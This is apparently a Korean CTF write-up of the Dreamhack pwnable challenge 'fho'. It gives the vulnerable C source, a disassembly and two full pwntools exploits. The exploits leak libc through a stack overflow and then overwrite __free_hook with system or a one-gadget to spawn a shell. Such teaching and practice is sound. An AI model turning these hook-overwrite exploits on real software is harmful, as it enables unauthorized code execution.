---
layout: post
title: Dreamhack | fho
subtitle: Dreamhack-Pwnable fho
categories: dreamhack.io
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/200307765-c3ab5c40-5c8c-45ba-a7e4-67f20142b440.jpg" width = 550>
</p>

이 문제는 **Hook Overwrite** 로드맵에서 내용을 이해했는지 확인차 푸는 문제입니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/200308030-3ac3cead-e940-44a0-972f-f4ec19b9f8da.jpg" width = 340>
</p>

모든 보호기법이 설정되어 있는 것을 알 수 있다.

## 문제 풀이

**Full RELRO**로 인해서 Now binding, 프로그램이 실행될 때 해당 프로그램에서 사용되는 함수들의 주소를 읽어와 GOT 영역에 저장하기에, GOT Overwrite가 불가능하다.

하지만, C언어의 동적 할당과 해제를 담당하는 `malloc, free, realloc`는 libc.so에 구현되어 있다.

각 함수들은 실행전에 `__malloc_hook, __free_hook, __realloc_hook`이라는 훅 변수를 이용한다. 이 함수들 또한 libc.so에 정의되어 있지만, 쓰기 권한을 가진 **bss** 섹션에 존재하기에 값을 조작할 수 있다.

`__malloc_hook`을 `system` 함수로 덮고, `malloc('/bin/sh')` 혹은 `__free_hook`을 `system` 함수로 덮고, `free('/bin/sh')`을 통해 셸을 획득할 수 있다.

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100); // BOF
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

```C
puts("[1] Stack buffer overflow");
printf("Buf: ");
read(0, buf, 0x100); // BOF
printf("Buf: %s\n", buf);
```

* buf의 주소보다 더욱 큰 값을 `read`하기에 BOF가 가능하다.

```C
puts("[2] Arbitary-Address-Write");
printf("To write: ");
scanf("%llu", &addr);
printf("With: ");
scanf("%llu", &value);
printf("[%p] = %llu\n", addr, value);
```

* `scanf("%llu", &addr);`로 덮어쓰고자 하는 주소(**__free_hook**)를 입력받을 수 있고, `scanf("%llu", &value); *addr = value;`를 통해 입력받은 주소에 원하는 값(**'/bin/sh'**)을 넣을 수 있다.

```C
puts("[3] Arbitrary-Address-Free");
printf("To free: ");
scanf("%llu", &addr);
free(addr);
```

* **__free_hook**과 **'/bin/sh'**를 넣었으므로 `free()`함수가 실행된다면 셸이 획득될 것이다. 또한, 이미 모든 로직은 완성되었으므로 마지막 `scanf("%llu", &addr);`는 어떤 값을 넣어도 괜찮다.

```armasm
# read(0, buf, 0x100);
0x000055555540092a <+112>:   lea    rax,[rbp-0x40]
0x000055555540092e <+116>:   mov    edx,0x100
0x0000555555400933 <+121>:   mov    rsi,rax
0x0000555555400936 <+124>:   mov    edi,0x0
0x000055555540093b <+129>:   call   0x555555400770 <read@plt>
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/200336244-c05203af-6ae2-421f-951f-7fe8234bf0ba.jpg" width = 480>
</p>

* 빨간 네모칸 : `read(0, buf, 0x100);`를 통해 **AAAA**를 대입한 값이 [rbp-0x40] 즉, buf의 위치가 된다.

* 노란 네모칸 : 노란 네모칸 앞 8byte는 **SFP**, 네모칸은 `__libc_start_main_ret`으로 RET의 위치가 된다. **gdb**사용시 **Backtrace**를 통해 `__libc_start_main+xxx`를 통해 알 수 있다.

buf에 0x48의 dummy 값을 넣어 출력되는 값은 `__libc_start_main_ret`가 되므로 해당 값을 통해 `libc_base`를 구한다. 이후 `__free_hook`을 이용하기 위해 해당 Symbol를 구하고, One-gadget을 통해 Exploit하면 된다.

### Exploit
```python
from pwn import *

p = process('./fho', env = {'LD_PRELOAD' : './libc-2.27.so'})
# p = remote('host3.dreamhack.games', 10103)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
binsh_offset = list(libc.search(b'/bin/sh\x00'))[0]

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols["system"]
binsh = libc_base + binsh_offset

p.sendlineafter("To write: ", str(free_hook))
p.sendlineafter("With: ", str(system))
p.sendlineafter("To free: ", str(binsh))

p.interactive()
```

### One-Gadget Exploit
```python
from pwn import *

p = process('./fho', env = {'LD_PRELOAD' : './libc-2.27.so'}) # libc linking
libc = ELF('./libc-2.27.so')

buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f432 # one gadget values

p.sendlineafter("write: ", str(free_hook))
p.sendlineafter("With: ", str(one_gadget))
p.sendlineafter("free: ", "0") # any values

p.interactive()
```